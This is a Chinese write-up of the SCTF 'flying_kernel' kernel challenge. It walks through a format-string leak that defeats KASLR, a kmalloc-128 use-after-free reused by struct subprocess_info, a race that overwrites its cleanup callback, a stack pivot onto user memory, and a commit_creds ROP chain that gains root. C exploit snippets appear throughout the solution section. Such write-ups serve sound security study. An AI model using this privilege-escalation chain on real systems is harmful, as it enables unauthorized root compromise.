# flying_kernel

## 题目简述

题目给出一个 Linux 内核模块。模块维护全局指针 `sctf_buf`，通过三个 `ioctl` 命令分别完成 `kmalloc(0x80)`、`kfree` 和 `printk(sctf_buf)`；释放后没有清空指针，因此同时存在 kmalloc-128 大小的 UAF 与格式化字符串漏洞。`write` 最多接收 `0x80` 字节，但写入起点是 `sctf_buf + 0x80 - len`，也就是从对象尾部向前覆盖。

本题本地仓库中的 `pwn/flying_kernel` 是未拉取的 Git 子模块，模块源码和运行环境可从[出题人的官方仓库](https://github.com/pray77/SCTF-flying_kernel)补齐。启动参数启用了 SMEP、KASLR 和 KPTI，明确使用 `nosmap` 关闭 SMAP；`kptr_restrict`、`dmesg_restrict` 与 `/proc/kallsyms` 权限又阻断了直接读取内核地址。预期解法是先用格式化字符串泄露内核基址，再让 UAF 槽位与 `struct subprocess_info` 重叠，通过竞争覆盖其 `cleanup` 回调并完成栈迁移。

## 解题过程

模块中决定利用方式的代码可以压缩为：

```c
case 0x5555:
    if (size == 0x80)
        sctf_buf = kmalloc(size, GFP_KERNEL);
    break;
case 0x6666:
    if (sctf_buf)
        kfree(sctf_buf);          // 指针未清空
    break;
case 0x7777:
    if (sctf_buf)
        printk(sctf_buf);         // 用户可控格式串
    break;

if (sctf_buf && len <= 0x80)
    copy_from_user(sctf_buf + 0x80 - len, buf, len);
```

首先申请对象，写入一组 `%llx`，再触发 `0x7777`。这里不能依赖 `%p`，因为内核会对指针输出做限制；连续读取栈上的十六进制值，从中识别落在内核映像内的返回地址，再减去静态偏移即可得到 KASLR slide：

```c
ioctl(fd, 0x5555, 0x80);
write(fd,
      "%llx %llx %llx %llx %llx %llx "
      "%llx %llx %llx %llx %llx %llx ",
      0x80);
ioctl(fd, 0x7777, 0);

kernel_slide = leaked_text_pointer - known_static_pointer;
```

随后执行 `ioctl(fd, 0x6666, 0)` 释放对象。`sctf_buf` 仍指向原槽位，因而后续 `write` 可以修改复用该槽位的新对象。`socket(22, AF_INET, 0)` 会走 `call_usermodehelper` 相关路径并分配 `struct subprocess_info`；该结构同样落入 kmalloc-128，其尾部包含 `init`、`cleanup` 和 `data` 等字段。利用代码用两个线程制造竞争：

```c
static void *overwrite_cleanup(void *arg) {
    uint64_t tail[4] = { xchg_eax_esp_ret, 0, 0, 0 };
    while (!won)
        write(fd, tail, 0x20);    // 恰好从偏移 0x60 覆盖对象尾部
    return NULL;
}

ioctl(fd, 0x6666, 0);
pthread_create(&thread, NULL, overwrite_cleanup, NULL);
while (!won)
    socket(22, AF_INET, 0);
```

覆盖长度必须保持为 `0x20`。模块会把这 32 字节写到原 `0x80` 对象的偏移 `0x60`，正好命中 `subprocess_info` 尾部的回调区；覆盖更多字段会破坏对象此前仍要使用的状态，常见结果是提权链已经运行却无法稳定回到用户态。

将 `cleanup` 改为 `xchg eax, esp; ret` 后，回调执行时 `RAX` 保存该 gadget 的地址。`xchg eax, esp` 会把 `RSP` 换成 gadget 地址的低 32 位，因此先在对应的页对齐地址映射用户内存并布置伪栈：

```c
uint64_t pivot = (uint32_t)xchg_eax_esp_ret;
void *page = mmap((void *)(pivot & ~0xfffULL), 0x2000,
                  PROT_READ | PROT_WRITE,
                  MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);

uint64_t *rop = (uint64_t *)pivot;
*rop++ = pop_rdi_ret;
*rop++ = 0;
*rop++ = prepare_kernel_cred;
*rop++ = mov_rdi_rax_ret;
*rop++ = commit_creds;
/* 后接恢复用户态所需的 trampoline 或 swapgs/iretq 帧。 */
```

这一步能成立是因为启动参数关闭了 SMAP，内核能够读取用户页；SMEP 仍然阻止直接执行用户代码，所以先在内核中执行 `prepare_kernel_cred(0)` 与 `commit_creds`。最后通过内核的 KPTI 返回路径，或等价的 `swapgs; iretq` 帧，恢复预先保存的 `CS`、`SS`、`RSP`、`RFLAGS` 和用户态入口。回到用户态后确认 `getuid() == 0`，再读取 `/flag`。

出题人的[赛后总结](https://www.anquanke.com/post/id/264563)还说明了两类替代路线：泄露 SLUB 随机值后攻击 freelist 并改写 `modprobe_path`，以及不返回用户态、直接在内核 ROP 中完成文件读取。它们解释了赛时出现的非预期解，但不改变预期链的核心：格式串泄露、kmalloc-128 UAF 复用、尾部定长覆盖、回调劫持和栈迁移。公开仓库没有提供比赛实例中的最终 flag，因此不臆造具体字符串。

## 方法总结

本题的关键不是单独发现 UAF，而是找到同一 slab 中带有可利用函数指针的内核对象。`struct subprocess_info` 的分配尺寸和生命周期都满足要求，模块特意设计的“从尾部写入”又允许只覆盖 `cleanup` 附近，显著提高竞争成功后的稳定性。

完整利用链为：格式化字符串绕过地址输出限制并计算 KASLR slide；释放 kmalloc-128 对象留下悬空指针；并发触发 `subprocess_info` 分配与 32 字节尾部覆盖；用 `xchg eax, esp; ret` 把栈迁移到用户映射页；执行 cred 提权 ROP；最后按 KPTI 要求恢复用户态。复现时应使用目标内核重新计算所有符号和 gadget 偏移，不能直接照搬其他构建中的常量。
